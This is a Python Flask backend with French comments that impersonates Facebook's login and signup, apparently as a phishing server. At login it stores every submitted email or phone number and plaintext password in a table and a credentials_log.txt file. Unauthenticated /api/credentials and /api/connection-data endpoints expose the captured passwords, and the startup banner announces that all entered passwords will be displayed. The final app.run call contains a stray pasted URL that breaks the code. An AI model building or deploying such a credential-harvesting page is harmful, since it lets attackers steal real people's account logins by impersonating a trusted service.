from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash
import sqlite3
import os
from datetime import datetime
import json
import sys
from dotenv import load_dotenv

# Charger les variables d'environnement
load_dotenv()

app = Flask(__name__, 
            static_folder='static',
            template_folder='templates')
CORS(app)

# Force output flush
sys.stdout.flush()

# Configuration
app.config['DATABASE'] = 'facebook.db'
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev_key_change_in_production')

# Fichier de log
LOG_FILE = 'credentials_log.txt'

def log_to_console_and_file(message):
    """Afficher en console ET enregistrer dans un fichier"""
    print(message, flush=True)
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(message + '\n')
    sys.stdout.flush()

# ============ INIT DATABASE ============

def init_db():
    """Initialiser la base de données"""
    if not os.path.exists(app.config['DATABASE']):
        with sqlite3.connect(app.config['DATABASE']) as conn:
            cursor = conn.cursor()
            
            # Table des utilisateurs
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    firstname TEXT NOT NULL,
                    lastname TEXT NOT NULL,
                    email TEXT UNIQUE NOT NULL,
                    phone TEXT,
                    password TEXT NOT NULL,
                    birth_date TEXT,
                    gender TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    login_attempts TEXT DEFAULT '[]'
                )
            ''')
            
            # Table des tentatives de connexion
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS login_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email_or_phone TEXT NOT NULL,
                    success BOOLEAN,
                    ip_address TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Table des données de connexion (pour debug/demo)
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS connection_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email_or_phone TEXT NOT NULL,
                    password TEXT NOT NULL,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
            print("✓ Base de données initialisée avec succès!")

def get_db_connection():
    """Obtenir une connexion à la base de données"""
    conn = sqlite3.connect(app.config['DATABASE'])
    conn.row_factory = sqlite3.Row
    return conn

# ============ FONCTIONS UTILITAIRES ============

def is_email(value):
    """Vérifier si c'est un email"""
    return '@' in value

def is_phone(value):
    """Vérifier si c'est un numéro de téléphone"""
    return value.isdigit() and len(value) >= 10

def get_client_ip():
    """Obtenir l'adresse IP du client"""
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        return request.environ.get('HTTP_X_FORWARDED_FOR').split(',')[0]
    return request.environ.get('REMOTE_ADDR')

# ============ ROUTES - INSCRIPTION ============

@app.route('/api/signup', methods=['POST'])
def signup():
    """Route pour enregistrer un nouvel utilisateur"""
    try:
        data = request.get_json()
        
        # Validation des données
        if not data:
            log_to_console_and_file("❌ ERREUR: Aucune donnée reçue")
            return jsonify({'success': False, 'message': 'Aucune donnée reçue'}), 400
        
        required_fields = ['firstname', 'lastname', 'email', 'password', 'birth_date', 'gender']
        for field in required_fields:
            if not data.get(field):
                log_to_console_and_file(f"❌ ERREUR: Le champ {field} est manquant")
                return jsonify({'success': False, 'message': f'Le champ {field} est obligatoire'}), 400
        
        firstname = data.get('firstname', '').strip()
        lastname = data.get('lastname', '').strip()
        email = data.get('email', '').strip().lower()
        password = data.get('password', '')
        birth_date = data.get('birth_date', '')
        gender = data.get('gender', '')
        phone = data.get('phone', '').strip() if data.get('phone') else None
        
        log_to_console_and_file("\n" + "="*80)
        log_to_console_and_file("📝 INSCRIPTION REÇUE DU FORMULAIRE")
        log_to_console_and_file("="*80)
        log_to_console_and_file(f"👤 PRÉNOM: {firstname}")
        log_to_console_and_file(f"👤 NOM: {lastname}")
        log_to_console_and_file(f"📧 EMAIL/ADRESSE: {email}")
        log_to_console_and_file(f"🔑 MOT DE PASSE: {password}")
        log_to_console_and_file(f"📱 TÉLÉPHONE: {phone}")
        log_to_console_and_file(f"📅 DATE NAISSANCE: {birth_date}")
        log_to_console_and_file(f"👥 SEXE: {gender}")
        log_to_console_and_file(f"⏰ HEURE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        log_to_console_and_file("="*80 + "\n")
        
        # Validation
        if not firstname or len(firstname) < 2:
            log_to_console_and_file("❌ ERREUR: Prénom invalide")
            return jsonify({'success': False, 'message': 'Le prénom doit avoir au moins 2 caractères'}), 400
        
        if not lastname or len(lastname) < 2:
            log_to_console_and_file("❌ ERREUR: Nom invalide")
            return jsonify({'success': False, 'message': 'Le nom doit avoir au moins 2 caractères'}), 400
        
        if not is_email(email):
            log_to_console_and_file("❌ ERREUR: Email invalide")
            return jsonify({'success': False, 'message': 'Email invalide'}), 400
        
        if len(password) < 6:
            log_to_console_and_file("❌ ERREUR: Mot de passe trop court")
            return jsonify({'success': False, 'message': 'Le mot de passe doit avoir au moins 6 caractères'}), 400
        
        # Vérifier si l'email existe déjà
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT id FROM users WHERE email = ?', (email,))
        if cursor.fetchone():
            conn.close()
            log_to_console_and_file(f"❌ ERREUR: Email {email} déjà existant")
            return jsonify({'success': False, 'message': 'Cet email est déjà utilisé'}), 400
        
        # Hacher le mot de passe
        hashed_password = generate_password_hash(password)
        
        # Insérer le nouvel utilisateur
        try:
            cursor.execute('''
                INSERT INTO users (firstname, lastname, email, phone, password, birth_date, gender)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (firstname, lastname, email, phone, hashed_password, birth_date, gender))
            
            conn.commit()
            user_id = cursor.lastrowid
            conn.close()
            
            log_to_console_and_file(f"\n✅ INSCRIPTION RÉUSSIE!")
            log_to_console_and_file(f"   ID: {user_id}")
            log_to_console_and_file(f"   Email: {email}")
            log_to_console_and_file(f"   Mot de passe: {password}")
            log_to_console_and_file(f"   Nom complet: {firstname} {lastname}\n")
            
            return jsonify({
                'success': True,
                'message': 'Inscription réussie!',
                'user_id': user_id,
                'email': email
            }), 201
        
        except sqlite3.IntegrityError as e:
            conn.close()
            log_to_console_and_file(f"❌ ERREUR IntegrityError: {str(e)}")
            return jsonify({'success': False, 'message': 'Erreur: Email déjà existant'}), 400
    
    except Exception as e:
        log_to_console_and_file(f"❌ ERREUR lors de l'inscription: {str(e)}")
        return jsonify({'success': False, 'message': f'Erreur serveur: {str(e)}'}), 500

# ============ ROUTES - CONNEXION ============

@app.route('/api/login', methods=['POST'])
def login():
    """Route pour la connexion"""
    try:
        data = request.get_json()
        
        # Validation du JSON reçu
        if not data:
            log_to_console_and_file("❌ ERREUR: Aucune donnée JSON reçue")
            return jsonify({'success': False, 'message': 'Aucune donnée reçue'}), 400
        
        email_or_phone = data.get('email_or_phone', '').strip()
        password = data.get('password', '')
        ip_address = get_client_ip()
        
        log_to_console_and_file("\n" + "="*80)
        log_to_console_and_file("🔐 CONNEXION REÇUE DU FORMULAIRE")
        log_to_console_and_file("="*80)
        log_to_console_and_file(f"📧 EMAIL/TÉLÉPHONE: {email_or_phone}")
        log_to_console_and_file(f"🔑 MOT DE PASSE: {password}")
        log_to_console_and_file(f"🌐 IP CLIENT: {ip_address}")
        log_to_console_and_file(f"⏰ HEURE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        log_to_console_and_file("="*80 + "\n")
        
        # Validation
        if not email_or_phone:
            log_to_console_and_file("❌ ERREUR: Email/Phone vide")
            return jsonify({'success': False, 'message': 'Email/Phone obligatoire'}), 400
        
        if not password:
            log_to_console_and_file("❌ ERREUR: Mot de passe vide")
            return jsonify({'success': False, 'message': 'Mot de passe obligatoire'}), 400
        
        # Enregistrer les données de connexion (à des fins de démo/debug)
        conn = get_db_connection()
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO connection_data (email_or_phone, password)
                VALUES (?, ?)
            ''', (email_or_phone, password))
            conn.commit()
            log_to_console_and_file(f"✅ Données ENREGISTRÉES en base de données")
        except Exception as db_error:
            log_to_console_and_file(f"❌ ERREUR base de données: {str(db_error)}")
            conn.close()
            return jsonify({'success': False, 'message': 'Erreur enregistrement données'}), 500
        
        # Chercher l'utilisateur par email
        cursor.execute('SELECT * FROM users WHERE email = ?', (email_or_phone,))
        user = cursor.fetchone()
        
        if user:
            log_to_console_and_file(f"👤 Utilisateur trouvé: {user['email']}")
        else:
            log_to_console_and_file(f"⚠️  Utilisateur NON trouvé pour: {email_or_phone}")
        
        # Vérifier le mot de passe
        success = False
        if user:
            success = check_password_hash(user['password'], password)
            if success:
                log_to_console_and_file(f"✅ Mot de passe CORRECT")
            else:
                log_to_console_and_file(f"❌ Mot de passe INCORRECT")
        
        # Enregistrer la tentative de connexion
        cursor.execute('''
            INSERT INTO login_logs (email_or_phone, success, ip_address)
            VALUES (?, ?, ?)
        ''', (email_or_phone, success, ip_address))
        conn.commit()
        
        if user and success:
            conn.close()
            log_to_console_and_file(f"✅ CONNEXION RÉUSSIE!")
            return jsonify({
                'success': True,
                'message': 'Connexion réussie!',
                'user': {
                    'id': user['id'],
                    'firstname': user['firstname'],
                    'lastname': user['lastname'],
                    'email': user['email']
                }
            }), 200
        else:
            conn.close()
            log_to_console_and_file(f"❌ CONNEXION ÉCHOUÉE!")
            return jsonify({'success': False, 'message': 'Email/Téléphone ou mot de passe incorrect'}), 401
    
    except Exception as e:
        print(f"Erreur lors de la connexion: {str(e)}")
        return jsonify({'success': False, 'message': f'Erreur serveur: {str(e)}'}), 500

# ============ ROUTES - MOT DE PASSE OUBLIÉ ============

@app.route('/api/forgot-password', methods=['POST'])
def forgot_password():
    """Route pour la récupération de mot de passe"""
    try:
        data = request.get_json()
        email = data.get('email', '').strip().lower()
        
        if not email or not is_email(email):
            return jsonify({'success': False, 'message': 'Email invalide'}), 400
        
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT id, email FROM users WHERE email = ?', (email,))
        user = cursor.fetchone()
        conn.close()
        
        if user:
            print(f"📧 Demande de réinitialisation pour: {email}")
            return jsonify({
                'success': True,
                'message': f'Lien de réinitialisation envoyé à {email}'
            }), 200
        else:
            # Ne pas révéler si l'email existe (sécurité)
            return jsonify({
                'success': True,
                'message': 'Si ce compte existe, un lien de réinitialisation sera envoyé'
            }), 200
    
    except Exception as e:
        print(f"Erreur lors de la récupération du mot de passe: {str(e)}")
        return jsonify({'success': False, 'message': f'Erreur serveur: {str(e)}'}), 500

# ============ ROUTES - AFFICHAGE DES DONNÉES ============

@app.route('/api/users', methods=['GET'])
def get_all_users():
    """Récupérer tous les utilisateurs (pour debug/admin)"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT id, firstname, lastname, email, birth_date, gender, created_at FROM users')
        users = cursor.fetchall()
        conn.close()
        
        users_list = []
        for user in users:
            users_list.append({
                'id': user['id'],
                'firstname': user['firstname'],
                'lastname': user['lastname'],
                'email': user['email'],
                'birth_date': user['birth_date'],
                'gender': user['gender'],
                'created_at': user['created_at']
            })
        
        return jsonify({'success': True, 'users': users_list, 'total': len(users_list)}), 200
    
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/api/connection-data', methods=['GET'])
def get_connection_data():
    """Récupérer tous les données de connexion (email, phone, mot de passe)"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT id, email_or_phone, password, timestamp FROM connection_data ORDER BY timestamp DESC')
        data = cursor.fetchall()
        conn.close()
        
        data_list = []
        for row in data:
            data_list.append({
                'id': row['id'],
                'email_or_phone': row['email_or_phone'],
                'password': row['password'],
                'timestamp': row['timestamp']
            })
        
        print(f"\n📊 AFFICHAGE DES DONNÉES DE CONNEXION CAPTURÉES:")
        print(f"   Total: {len(data_list)} tentatives")
        for item in data_list:
            print(f"   • Email/Adresse: {item['email_or_phone']}, Mot de passe: {item['password']}, Heure: {item['timestamp']}")
        
        return jsonify({'success': True, 'data': data_list, 'total': len(data_list)}), 200
    
    except Exception as e:
        print(f"❌ ERREUR get_connection_data: {str(e)}")
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/api/credentials', methods=['GET'])
def get_credentials():
    """Endpoint spécial pour afficher clairement Adresse + Mot de passe capturés"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Données de connexion (login attempts)
        cursor.execute('SELECT email_or_phone, password, timestamp FROM connection_data ORDER BY timestamp DESC LIMIT 50')
        connections = cursor.fetchall()
        
        # Utilisateurs inscrits
        cursor.execute('SELECT email, firstname, lastname FROM users ORDER BY created_at DESC LIMIT 50')
        users = cursor.fetchall()
        
        conn.close()
        
        credentials = []
        for conn_data in connections:
            credentials.append({
                'type': 'Tentative de connexion',
                'adresse_email': conn_data['email_or_phone'],
                'mot_de_passe': conn_data['password'],
                'timestamp': conn_data['timestamp']
            })
        
        for user in users:
            credentials.append({
                'type': 'Utilisateur inscrit',
                'adresse_email': user['email'],
                'nom': f"{user['firstname']} {user['lastname']}",
                'timestamp': 'N/A'
            })
        
        print(f"\n{'='*70}")
        print(f"🔐 RÉSUMÉ DES ADRESSES EMAIL ET MOTS DE PASSE CAPTURÉS:")
        print(f"{'='*70}")
        print(f"Connexions ({len(connections)}):")
        for c in connections:
            print(f"  ✓ Email: {c['email_or_phone']} | Mot de passe: {c['password']}")
        print(f"\nUtilisateurs ({len(users)}):")
        for u in users:
            print(f"  ✓ Email: {u['email']} | Nom: {u['firstname']} {u['lastname']}")
        print(f"{'='*70}\n")
        
        return jsonify({
            'success': True,
            'credentials': credentials,
            'total_connections': len(connections),
            'total_users': len(users)
        }), 200
    
    except Exception as e:
        print(f"❌ ERREUR get_credentials: {str(e)}")
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/api/login-logs', methods=['GET'])
def get_login_logs():
    """Récupérer les logs de connexion"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT id, email_or_phone, success, ip_address, timestamp FROM login_logs ORDER BY timestamp DESC LIMIT 100')
        logs = cursor.fetchall()
        conn.close()
        
        logs_list = []
        for log in logs:
            logs_list.append({
                'id': log['id'],
                'email_or_phone': log['email_or_phone'],
                'success': log['success'],
                'ip_address': log['ip_address'],
                'timestamp': log['timestamp']
            })
        
        return jsonify({'success': True, 'logs': logs_list, 'total': len(logs_list)}), 200
    
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Récupérer les statistiques"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) as total FROM users')
        total_users = cursor.fetchone()['total']
        
        cursor.execute('SELECT COUNT(*) as total FROM login_logs')
        total_logins = cursor.fetchone()['total']
        
        cursor.execute('SELECT COUNT(*) as total FROM login_logs WHERE success = 1')
        successful_logins = cursor.fetchone()['total']
        
        cursor.execute('SELECT COUNT(*) as total FROM connection_data')
        total_connections = cursor.fetchone()['total']
        
        conn.close()
        
        return jsonify({
            'success': True,
            'stats': {
                'total_users': total_users,
                'total_login_attempts': total_logins,
                'successful_logins': successful_logins,
                'total_connections': total_connections
            }
        }), 200
    
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

# ============ PAGE D'ACCUEIL ============

@app.route('/', methods=['GET'])
def index():
    """Page d'accueil avec formulaire HTML"""
    return render_template('index.html')

# ============ GESTION DES ERREURS ============

@app.errorhandler(404)
def not_found(error):
    return jsonify({'success': False, 'message': 'Endpoint non trouvé'}), 404

@app.errorhandler(500)
def server_error(error):
    return jsonify({'success': False, 'message': 'Erreur serveur interne'}), 500

# ============ MAIN ============

if __name__ == '__main__':
    # Initialiser la base de données
    init_db()
    
    # Créer/Nettoyer le fichier de log
    with open(LOG_FILE, 'w', encoding='utf-8') as f:
        f.write("="*80 + "\n")
        f.write("📊 LOG DES DONNÉES - FACEBOOK LOGIN\n")
        f.write("="*80 + "\n\n")
    
    log_to_console_and_file("\n" + "█"*80)
    log_to_console_and_file("█ " + " "*76 + " █")
    log_to_console_and_file("█ " + "🚀 SERVEUR FACEBOOK BACKEND DÉMARRÉ!".center(76) + " █")
    log_to_console_and_file("█ " + " "*76 + " █")
    log_to_console_and_file("█"*80)
    log_to_console_and_file("")
    log_to_console_and_file("📍 Serveur accessible sur: http://localhost:5000")
    log_to_console_and_file("📊 Base de données: facebook.db")
    log_to_console_and_file("📝 Log des identifiants: credentials_log.txt")
    log_to_console_and_file("")
    log_to_console_and_file("✅ Tous les emails, adresses et mots de passe saisis seront affichés ci-dessous:")
    log_to_console_and_file("✅ Vérifiez aussi le fichier: credentials_log.txt")
    log_to_console_and_file("")
    log_to_console_and_file("█"*80 + "\n")
    
    # Configuration pour production/développement
    port = int(os.getenv('PORT', 5000))
    debug_mode = os.getenv('DEBUG', 'False').lower() == 'true'
    
    # Démarrer le serveur
    app.run(
        host='0.0.0.0',
        port=port,
        debug=debug_mode,
        use_reloader=False        https://votre-app.onrender.com        https://votre-app.onrender.com
    )
